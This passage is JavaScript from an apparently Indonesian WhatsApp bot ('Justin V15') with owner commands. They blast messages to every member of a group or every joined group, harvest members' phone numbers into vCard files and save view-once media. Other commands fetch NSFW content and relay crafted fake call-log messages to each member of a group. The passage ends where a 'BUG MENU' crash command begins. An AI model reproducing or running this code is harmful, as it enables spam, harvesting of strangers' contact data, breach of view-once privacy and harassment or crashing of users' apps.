        const [namaBarang, harga, viaPembayaran] = args.map(arg => arg.trim());

        // Tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);
const fler = {
text: `*TRANSAKSI DONE*
📦 PRODUK : *${namaBarang}*
📤 HARGA : *Rp ${harga}.000*
📆 TANGGAL  : *${formattedDate}*

*TERIMAKASIH ATAS KEPERCAYAAN NYA*`
}
await Justinn.sendMessage(m.chat, fler, {quoted: qlocPay})
}
break

case "pushkontak": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Justinn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Justinn.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Justinn.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Justinn.sendMessage(jidawal, {text: `*Berhasil Pushkontak…*\nTotal member Berhasil Dikirim Pesan : ${halls.length}`}, {quoted: m})
}
break

case "pushkontak1":
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(`*[V15 Notice]* Gunakan Fitur Ini Kusus Di Dalam Grup!`)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} Jeda|Teks`)
await m.reply(`*[V15 Notice]* Memproses *pushkontak*`)
const data = await Justinn.groupMetadata(m.chat)
const halsss = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Justinn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Justinn.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Justinn.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
                    quoted: qloc
                    }
}
m.reply(`*[V15 Notice]* Berhasil Pushkontak\nTotal Member ${halsss.length} Berhasil Dikirim Pesan`)
break

case "pushkontak2": {

if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 Idgc|Jeda|Pesan\n\n*Note :* Jeda 1 Detik = 1000\nketik *.listgc* Untuk Melihat Semua List Id Grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushgt Idgc|Jeda|Pesan\n\n*Note :* Jeda 1 Detik = 1000\nKetik *.listgc* Untuk Melihat Semua List Id Grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 Idgc|Jeda|Pesan\n\n*Note :* Jeda 1 Detik = 1000\nKetik *.listgc* Untuk Melihat Semua List Id Grup")
var groupMetadataa
try {
groupMetadataa = await Justinn.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ*[Notice]* ID Grup Tidak Valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Internal/database/contacts.json', JSON.stringify(contacts))
await Justinn.sendMessage(mem, {text: teks}, {quoted: qloc})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Internal/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Justinn.sendMessage(m.sender, { document: fs.readFileSync("./Internal/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat…", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Internal/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Internal/database/contacts.vcf", "")
}}
break

case "savekontak1": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("*[ＲＥＢＯＲＮ  ＣＲＡＳＨＥＲ Notice]* Id Grupnya?"))
let res = await Justinn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./Internal/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Internal/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil Membuat File Kontak…*
File Kontak Telah Dikirim Ke Private Chat
Total *${halls.length}* Kontak`)
await Justinn.sendMessage(m.sender, { document: fs.readFileSync("./Internal/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Dibuat…\nTotal *${halls.length}* Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Internal/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Internal/database/contacts.vcf", "")
}}
break

case "savekontak": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./Internal/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Internal/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil Membuat File Kontak…*
File Kontak Telah Dikirim Ke Private Chat
Total *${halls.length}* Kontak`)
await Justinn.sendMessage(m.sender, { document: fs.readFileSync("./Internal/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat…\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Internal/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Internal/database/contacts.vcf", "")
}}
break

case "jpm": {
if (!isCreator) return m.reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("*[V15 Notice]* Teksnya Atau Reply Pesan"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await Justinn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Ke ${usergc.length} Grup`)
for (let jid of usergc) {
try {
await Justinn.sendMessage(jid, {text: teks}, {quoted: qloc})
total += 1
} catch {}
await sleep(global.delayJpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case "addidch": {
    if (!isCreator) return m.reply(mess.owner); // Periksa apakah pengguna adalah creator
    if (!text) return m.reply("Format: addidch id_saluran");

    // Split input menjadi array (untuk menangani lebih dari satu ID)
    const idSaluranBaru = text.split("|").map((id) => id.trim());

    // Validasi apakah ID saluran dalam format yang benar
    const validIdSaluran = idSaluranBaru.filter((id) => id.endsWith("@newsletter"));
    if (validIdSaluran.length === 0) {
        return m.reply(
            "ID saluran tidak valid! Pastikan menggunakan format: 120363373003239606@newsletter"
        );
    }

    // Update daftar saluran
    validIdSaluran.forEach((id) => {
        if (!daftarSaluran.includes(id)) {
            daftarSaluran.push(id); // Tambahkan ID ke daftar jika belum ada
        }
    });

    m.reply(
        `Berhasil menambahkan ${validIdSaluran.length} ID saluran:\n${validIdSaluran.join(
            "\n"
        )}`
    );
}
break;

case "jpmallch":
case "jpmsaluran": {
    if (!isCreator) return m.reply(mess.owner); // Periksa apakah pengguna adalah creator
    if (!text) return m.reply("Format: Jpmallch Jumlah_Pesan|Waktu|Teks");

    // Memisahkan parameter
    const [jumlahPesan, waktu, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali
    const daftarSaluran = [];

    // Validasi parameter
    if (!jumlahPesan || isNaN(jumlahPesan) || !waktu || isNaN(waktu) || !teks) {
        return m.reply("Format salah! Gunakan: Jpmallch Jumlah_Pesan|Waktu|Teks");
    }

    const jumlah = parseInt(jumlahPesan);
    const interval = parseInt(waktu) * 60 * 1000; // Konversi menit ke milidetik

    m.reply(`*Mengirim ${jumlah} pesan setiap ${waktu} menit ke daftar saluran...*`);

    let counter = 0;

    // Fungsi pengiriman pesan dengan interval
    const pengirimanPesan = setInterval(async () => {
        if (counter >= jumlah) {
            clearInterval(pengirimanPesan); // Hentikan pengiriman setelah selesai
            return m.reply("*DONE JPM ALL CH*");
        }

        for (const idSaluran of daftarSaluran) {
            try {
                await Justinn.sendMessage(idSaluran, { text: teks });
            } catch (error) {
                console.error(`Gagal Mengirim Ke Saluran ${idSaluran}:`, error);
            }
        }

        counter++;
    }, interval);
}
break;

case "jpmchfoto": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Balas/Kirim Foto Dengan Teks");
    if (!/image/.test(mime)) return m.reply("Format Salah! Balas/Kirim Foto Dengan Teks.");
    
    let image = await Justinn.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [];
    let total = 0;

    m.reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await Justinn.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal Mengirim Ke Saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayJpm); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    m.reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;

case "jpmhidetag": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text && !m.quoted) return m.reply(example("Teksnya Atau Reply Pesan"));

    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;
    let getGroups = await Justinn.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);

    m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`);

    for (let jid of usergc) {
        try {
            // Ambil data member grup
            let groupMetadata = await Justinn.groupMetadata(jid);
            let participants = groupMetadata.participants.map((p) => p.id);

            // Format teks dengan mention semua member
            let mentions = participants.join(", ");
            let teksWithMentions = `${teks}\n\nTag:\n${mentions}`;

            await Justinn.sendMessage(jid, {
                text: teksWithMentions,
                mentions: participants,
            }, { quoted: qloc });

            total += 1;
        } catch (error) {
            console.error(`Gagal Mengirim Pesan Ke Grup ${jid}:`, error);
        }
        await sleep(global.delayJpm);
    }

    m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`);
}
break;

case "jpm1": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("Teksnya Dengan Balas/Kirim Foto"))
if (!/image/.test(mime)) return m.reply(example("Teksnya Dengan Balas/Kirim Foto"))
let image = await Justinn.downloadAndSaveMediaMessage(qmsg)
let total = 0
let getGroups = await Justinn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
Justinn.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qloc})
total += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break

case "jpm2": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(example("Teksnya Dengan Balas/Kirim Video"))
    if (!/video/.test(mime)) return m.reply(example("Teksnya Dengan Balas/Kirim Video"))
    
    let video = await Justinn.downloadAndSaveMediaMessage(qmsg)
    let total = 0
    let getGroups = await Justinn.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
    let usergc = groups.map((v) => v.id)
    
    m.reply(`Memproses Mengirim Pesan Teks & Video Ke *${usergc.length} Grup*`)
    
    for (let jid of usergc) {
        try {
            Justinn.sendMessage(jid, {
                video: await fs.readFileSync(video),
                caption: text,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true
                }
            }, { quoted: qloc })
            total += 1
        } catch {}
        await sleep(global.delayJpm)
    }
    
    await fs.unlinkSync(video)
    m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break

case "jpmtesti": {

if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(example("Teks Dengan Mengirim Foto"))
if (!/image/.test(mime)) return m.reply(example("Teks Dengan Mengirim Foto"))
const allgrup = await Justinn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Justinn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* Testimoni Ke ${res.length} Grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Justinn.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Justinn.sendMessage(jid, {text: `*Jpm Telah Selesai…*\nTotal Grup Yang Berhasil Dikirim Pesan : ${count}`}, {quoted: m})
}
break

case "jpmslide": {

if (!isCreator) return m.reply(mess.owner)
let allgrup = await Justinn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} Grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Justinn.sendMessage(jid, {text: `*Jpm Telah Selesai…*\nTotal Grup Yang Berhasil Dikirim Pesan : ${count}`}, {quoted: m})
}
break

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return m.reply(mess.owner)
let allgrup = await Justinn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide Hidetag* Ke ${res.length} Grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Justinn.sendMessage(jid, {text: `*Jpm Telah Selesai…*\nTotal Grup Yang Berhasil Dikirim Pesan : ${count}`}, {quoted: m})
}
break

case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await Justinn.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
Justinn.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `Â© ${namaOwner}`,  sourceUrl: global.linkSaluran, previewType: "PHOTO"}}}, {quoted: qtext})
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Justinn.newsletterMetadata("invite", result)
let teks = `
*ID :* ${res.id}
*Nama :* ${res.name}
*Total Pengikut :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//======================[ END JB MENU ]===============================================================//

//======================[ FUN MENU ]===============================================================//

case 'hentaineko':

if (!isOwner && !isPrem) return m.reply(mess.prem)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Justinn.sendMessage(m.chat, { caption: "Sange Lu Cil? 😹", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	
        	xpaytod(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			Justinn.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
			case 'r34': {
				
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					Justinn.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image From Justin\n\n*Powered By Justin Ganteng*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		
case "welcome": {

if (!isOwner) return xpaytod(mess.ketua)
if (!text) return m.reply(`Example *.welcome* on/off`)
if (/on/.test(text)) {
global.welcome = true
m.reply("*[Justin V15]* Sukses On Welcome!")
} else if (/off/.test(text)) {
global.welcome = false
m.reply("*[Justin V15]* Sukses Off Welcome!")
} else {
return m.reply(`Example *.welcome* on/off`)
}
}
break 
case "antilink": {
	
if (!isOwner) return xpaytod(mess.ketua)
if (!text) return m.reply(`Example *.antilink* on/off`)
if (/on/.test(text)) {
global.antilink = true
m.reply("Berhasil menyalakan antilink")
} else if (/off/.test(text)) {
global.antilink = false
m.reply("Berhasil mematikan antilink")
} else {
return m.reply(`Example *.antilink* on/off`)
}
}
break 
case 'brat': {
	
if (!q) return xpaytod(`Masukkan Teks\n\nContoh: ${prefix + command} Justin Ganteng`);
let rulz = `https://api.zenkey.my.id/api/maker/brat?text=${encodeURIComponent(q)}&apikey=zenkey`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await Justinn.sendImageAsSticker(m.chat, buffer, m, { packname: `JustinGanteng`, author: `JustinOfficialV15` });
} catch (e) {
console.log(e);
await reply(`*[V15 Justin]* Kusus Owner!!`);
    }
}
break;
case "qc": {
	
if (!text) return m.reply("Mana Teksnya?")
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply("Proses generate Qc . . .")
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Justinn.sendImageAsSticker(m.chat, tempnya, m, {packname: global.author })
fs.unlinkSync(`./${tempnya}`)
})
})
}
break

//================================================================================
case "rvo": {
    
if (!m.quoted) return m.reply(example("Reply Pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan Itu Bukan Viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Justinn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Justinn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Justinn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
//=======
case 'cc': case 'capcut': {
	
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}

if (!text.includes('www.capcut.net')) return m.reply('Masukin link Capcut Dongo 😹')
let hasil = await download(text)

try {

let JustinnCcDnL = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
JustinnCcDnL += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
JustinnCcDnL += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
JustinnCcDnL += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
JustinnCcDnL += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
JustinnCcDnL += `⏤͟͟͞͞╳────────── .✦`

await Justinn.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: JustinnCcDnL }, { quoted: m })

} catch (e) {
 m.reply('Yah Error Jir')
}

}
break

			
            case 'pe': {
                
               m.reply('kontol')
            }
            break
			
			case "public": {
                
				if (!isOwner) return
				m.reply("*[V15]* Sukses Change Public!")
				Justinn.public = true
			}
			break

			case "self": {
                
				if (!isOwner) return
				m.reply("*[V15]* Sukses Change Self!")
				Justinn.public = false
			}
			break

            case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await Justinn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return xreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await Justinn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    xreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break

            case 'toimage': 
            case 'toimg': {
         
                if (!/webp/.test(mime)) {
                    return xreply(`Reply/Balas Stiker Dengan Teks: *${prefix + command}*`);
                }
                
                let media = await Justinn.downloadAndSaveMediaMessage(qmsg);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    Justinn.sendMessage(m.chat, { image: buffer }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            }
            break

            case "shortlink": 
            case "shorturl": {
                
                if (!text) return xreply(`Contoh: ${prefix + command} https://showmypenis`);
                if (!isUrl(text)) return xreply(`Contoh: ${prefix + command} https://showmypenis`);
            
                var res = await axios.get('https://tinyurl.com/api-create.php?url=' + encodeURIComponent(text));
                var link = `\n*Shortlink By JustinURL*\n${res.data.toString()}`;
            
                await xreply(link);
            }
            break

            case 'tourl': {
                
                if (!/video/.test(mime) && !/image/.test(mime)) return xreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}`);
                let pnis = await m.quoted ? m.quoted : m;
                let media = await pnis.download();
                let link = await TelegraPh(media);
                await sleep(1000);
                await xreply(`${link}`);
            }
            break

            case "cekjid": {
                
                if (!isOwner) return
                xreply(`${m.chat}`);
            }
            break

            // au ah, buat yg ngerti aja
            case "x-gc": {
                
                if (!isOwner) return //😹
                let [jidsny, teks] = q.split("|");
                let metadata2 = await Justinn.groupMetadata(jidsny);
                let colls = metadata2.participants;
            
                for (let mem of colls) {
                    let jidd = mem.id.split('@')[0] + "@s.whatsapp.net";
            
                    try {
                        await Justinn.relayMessage(jidd, {
                            extendedTextMessage: {
                                text: teks,
                                contextInfo: {
                                    remoteJid: "status@broadcast",
                                    participant: "0@s.whatsapp.net",
                                    quotedMessage: {
                                        callLogMesssage: {
                                            isVideo: true,
                                            callOutcome: "1",
                                            durationSecs: "0",
                                            callType: "REGULAR",
                                            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                                        }
                                    }
                                }
                            }
                        }, { participant: { jid: jidd } });
            
                        await sleep(500);
            
                        await Justinn.relayMessage(jidd, {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.15575-24/19454052_887239376370707_1335161085331526466_n.enc?ccb=11-4&oh=01_Q5AaIJLMvNTGsNlqqBNxaXGwXB7TaTNt98CU_hYSDhXNUNUL&oe=6735FC8B&_nc_sid=5e03e0&mms3=true",
                                fileSha256: "zNeoLRpsgYs7zOkmw9hJ3YCdiQmv43cXzxHOFoLG8Ho=",
                                fileEncSha256: "/jzkyt6lleSFF4RYV/1tb7mkmaErv1fsLqKiFizdsZg=",
                                mediaKey: "sPvNxA5VWzrCX9qR4Q9FPjmpAHs22jd2D+LBC1OB0a8=",
                                mimetype: "image/webp",
                                height: 64,
                                width: 64,
                                directPath: "/v/t62.15575-24/19454052_887239376370707_1335161085331526466_n.enc?ccb=11-4&oh=01_Q5AaIJLMvNTGsNlqqBNxaXGwXB7TaTNt98CU_hYSDhXNUNUL&oe=6735FC8B&_nc_sid=5e03e0",
                                fileLength: "29528",
                                mediaKeyTimestamp: "1729000225",
                                isAnimated: false,
                                stickerSentTs: "1729000225485",
                                isAvatar: false,
                                isAiSticker: false,
                                isLottie: false
                            }
                        }, { participant: { jid: jidd } });
            
                        await sleep(1000);
                    } catch (error) {
                        console.error(`Error sending `, error);
                    }
                }
                await xreply("*[V15]* Sukses Deck")
            }
            break
case 'joingc': {
      

if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Kirim perintah ${prefix+command} *_Link Grup Nya?_*`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var zoni = await Justinn.groupAcceptInvite(ini_urrrl)
m.reply('*Sukses Join Ke Grup*')
}
break
//======================[ END FUN MENU ]===============================================================//

//======================[ BUG MENU ]===============================================================//

//ANDRO

case 'justin-forclose': { // BUG HARD

if (!isPremium && !isOwner && !isUnli) return reply(mess.premium)
if (!q) {
